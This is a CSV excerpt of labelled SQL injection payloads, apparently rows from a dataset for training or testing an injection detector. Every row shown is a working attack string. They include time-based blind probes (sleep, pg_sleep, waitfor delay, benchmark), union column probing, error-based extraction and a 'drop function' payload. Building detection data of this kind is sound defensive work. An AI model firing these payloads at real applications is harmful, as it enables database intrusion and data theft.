row_index,payload_norm,label,sqli_type_hint
9270,1' and 2908 = 8067--,1,
9271,"1%' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",1,
9272,"1"" where 7371 = 7371 waitfor delay '0:0:5'--",1,
9273,"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""zyeo"" like ""zyeo",1,
9274,"1%' ) ) union all select null,null,null,null--",1,
9275,1' in boolean mode ) and 4457 = 3885#,1,
9276,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""%"" = """,1,
9277,"1"" where 7879 = 7879",1,
9278,"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",1,
9279,"1%"" ) ) union all select null,null--",1,
9280,1%' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
9281,"1"" ) ) waitfor delay '0:0:5'--",1,
9282,"1' ) as nmzp where 3794 = 3794 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
9283,"1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
9284,"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
9285,if ( 8182 = 3225 ) select 8182 else drop function kpzk--,1,
9286,"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 8529 = 8529",1,
9287,1 ) as xtgr where 1545 = 1545,1,
9288,"1%"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
9289,"1"" ) ) as ikuz where 7385 = 7385",1,
9290,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # twev,1,
9291,"-7923"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""szct"" = ""szct",1,
9292,"1' ) as omtb where 1183 = 1183 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
9293,1'|| ( select 'czos' from dual where 6814 = 6814,1,
9294,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'lzbn' = 'lzbn,1,
9295,"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""sfbc"" = ""sfbc",1,
9296,"1%"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""%"" = """,1,
9297,"1' in boolean mode ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
9298,"-1985%' ) ) ) union all select 3051,3051,3051--",1,
9299,"-7661"" union all select 9551,9551,9551#",1,
